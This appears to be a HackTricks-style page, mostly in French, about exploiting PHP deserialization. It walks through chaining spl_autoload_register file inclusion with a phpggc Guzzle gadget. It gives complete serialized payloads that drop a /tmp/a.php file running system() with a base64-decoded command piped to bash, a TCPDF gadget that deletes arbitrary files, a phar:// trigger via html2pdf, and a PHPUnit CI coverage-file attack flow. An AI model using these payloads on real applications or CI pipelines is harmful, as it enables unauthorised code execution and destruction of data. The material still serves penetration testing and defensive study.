# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

First, you should check what are [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

Nous sommes dans une situation où nous avons trouvé une **désérialisation PHP dans une webapp** sans aucune bibliothèque vulnérable à des gadgets dans **`phpggc`**. Cependant, dans le même conteneur se trouvait une **autre webapp composer avec des bibliothèques vulnérables**. L'objectif était donc de **charger le composer loader de l'autre webapp** et de l'abuser pour **charger un gadget qui exploitera cette bibliothèque** depuis la webapp vulnérable à la désérialisation.

Steps:

- Vous avez trouvé une **désérialisation** et il n'y a **aucun gadget** dans le code de l'application courante
- Vous pouvez abuser d'une fonction **`spl_autoload_register`** comme suit pour **charger n'importe quel fichier local avec l'extension `.php`**
- Pour cela vous utilisez une désérialisation où le nom de la classe sera placé dans **`$name`**. Vous **ne pouvez pas utiliser "/" ou "."** dans un nom de classe dans un objet sérialisé, mais le **code** remplace les **underscores** ("_") **par des slashes** ("/"). Donc un nom de classe tel que `tmp_passwd` sera transformé en `/tmp/passwd.php` et le code essaiera de le charger.\
Un **exemple de gadget** sera : **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> If you have a **file upload** and can upload a file with **`.php` extension** you could **abuse this functionality directly** and get already RCE.

Dans mon cas, je n’avais rien de tel, mais il y avait dans le **same container** une autre page web composer avec une **library vulnerable to a `phpggc` gadget**.

- To load this other library, first you need to **load the composer loader of that other web app** (because the one of the current application won’t access the libraries of the other one.) **Knowing the path of the application**, you can achieve this very easily with: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
- Now, you can **load** the others **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
- NOTE: The **generated gadget was not working**, in order for it to work I **modified** that payload **`chain.php`** of phpggc and set **all the attribute**s of the classes **from private to public**. If not, after deserializing the string, the attributes of the created objects didn’t have any values.
- Now we have the way to **load the others app composer loader** and have a **phpggc payload that works**, but we need to **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. For that, I sent a serialized array with both objects like:
- You can see **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Maintenant, nous pouvons **créer et écrire un fichier**, cependant, l'utilisateur **n'a pas pu écrire dans un quelconque dossier du serveur web**. Donc, comme vous pouvez le voir dans le payload, un PHP appelant **`system`** avec du **base64** est créé dans **`/tmp/a.php`**. Ensuite, nous pouvons **réutiliser le premier type de payload** que nous avons utilisé comme LFI pour charger le composer loader de l'autre webapp **pour charger le fichier généré `/tmp/a.php`**. Il suffit de l'ajouter au deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Résumé du payload**

- **Charger le composer autoload** d'une autre webapp dans le même conteneur
- **Charger un gadget phpggc** pour abuser d'une bibliothèque de l'autre webapp (la webapp initiale vulnérable à la deserialization n'avait aucun gadget dans ses bibliothèques)
- Le gadget va **créer un fichier avec un PHP payload** dans /tmp/a.php contenant des commandes malveillantes (l'utilisateur de la webapp ne peut écrire dans aucun dossier d'aucune webapp)
- La partie finale de notre payload va **charger le fichier php généré** qui exécutera les commandes

J'ai dû **appeler cette deserialization deux fois**. Lors de mes tests, la première fois le fichier `/tmp/a.php` a été créé mais pas chargé, et la deuxième fois il a été correctement chargé.

### Nouveautés phpggc (2025)

- La **branche master de phpggc continue d'ajouter des chains** : OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 et d'autres sont arrivés en 2025 — utile lorsque l'app cible partage du vendor code avec ces projets. Une façon rapide de chercher est `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (mettez à jour votre clone d'abord).
- Lors du mix de gadgets entre apps via autoloading, souvenez-vous que **les propriétés private dans les définitions de gadget peuvent être supprimées** lorsque les classes sont redéclarées différemment sur la cible ; éditez le `chain.php` du gadget pour rendre les propriétés `public` si le payload arrive avec des valeurs vides (même astuce montrée ci‑dessus).

## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)

`phpunit` avant **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) a désérialisé des objets PHP arbitraires à partir de fichiers `.coverage` produits par le **PHPT runner**. Dans des pipelines CI où des contributeurs non fiables peuvent pousser des tests, déposer un fichier `.coverage` malveillant déclenche la deserialization dès que la suite s'exécute — aucun accès web requis.

**Flux d'attaque**

1. Placer un fichier `.coverage` malveillant dans le repo (ou artifact) contenant un gadget sérialisé qui existe dans les dépendances de test (ex. une chain Monolog ou Guzzle depuis phpggc).
2. Soumettre un PR ; quand la CI exécute `phpunit --configuration phpunit.xml`, le PHPT runner lit le fichier coverage et désérialise le gadget, donnant **RCE inside the runner container**.
3. C'est particulièrement dangereux quand les tests montent des secrets CI (cloud creds, deployment keys).

**Exemple minimal de coverage malveillant** (déposer à côté d'un test PHPT):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Exécutez le PHPT pour que phpunit consomme `exploit.coverage`.

## TCPDF `__destruct` POP chain for arbitrary file deletion

Quand une vraie instance de `TCPDF` est détruite par le garbage collector, elle appelle `_destroy(true)`, itère sur `$this->imagekeys`, et appelle `unlink()` sur tout ce qui ressemble à un fichier de cache sous `K_PATH_CACHE`. Si une application exécute `unserialize($user_data)` alors que la classe `TCPDF` est chargée (p.ex. si elle attend un tableau avec une clé `html`), vous pouvez fournir un objet sérialisé qui définit :

- `file_id` à n'importe quel entier qui n'est pas présent dans `self::$cleaned_ids` (p.ex. `-1`).
- `imagekeys` vers des chemins qui commencent par `K_PATH_CACHE` ou qui peuvent être rendus similaires (p.ex. `/tmp/../tmp/do_not_delete_this_file.txt` lorsque `K_PATH_CACHE` est `/tmp/`).

Exemple de payload ciblant un flux unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` :
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Le fichier est supprimé dès que l'objet sort de la portée. TCPDF 6.9.3 a renforcé la vérification pour ne supprimer que les chemins avec le préfixe `__tcpdf_<file_id>_` à l'intérieur de `K_PATH_CACHE` et a introduit `_unlink()` pour bloquer les schémas non-`file://`, donc les anciennes versions de `Producer` sont des cibles idéales.

### Déclencher le gadget via `phar://` dans les balises `<cert>` de html2pdf

`spipu/html2pdf` (≤5.3.0) encapsule TCPDF et expose un bloc `<cert>` personnalisé dont les attributs `src`/`privkey` sont vérifiés avec la simple fonction `file_exists()`. Sur PHP < 8.0, toute fonction de système de fichiers qui accède à une URL `phar://` provoque la désérialisation des métadonnées Phar. En stockant l'objet TCPDF malveillant ci-dessus dans une archive Phar vous obtenez un POP fiable même si l'application n'appelle jamais `unserialize()` elle-même.

1. Créez un Phar avec `phar.readonly=0`, configurez le stub/manifest pour ressembler à une image (par ex. renommer `archive.phar` en `archive.png`), et stockez l'objet TCPDF sérialisé dans les métadonnées Phar.
2. Téléversez/placez le fichier à un emplacement accessible comme `/tmp/user_files/user_1/archive.png`.
3. Soumettez du HTML contenant la balise CERT afin que html2pdf résolve le chemin contrôlé par l'attaquant :
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
L'appel à `file_exists()` désérialise les métadonnées, instancie TCPDF, et son destructeur supprime le fichier choisi, transformant html2pdf en un puissant point d'entrée `phar://`. La version 5.3.1 a ajouté `Security::checkValidPath()` pour bloquer les schémas non approuvés, donc les déploiements hérités restent attractifs.

## Références

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
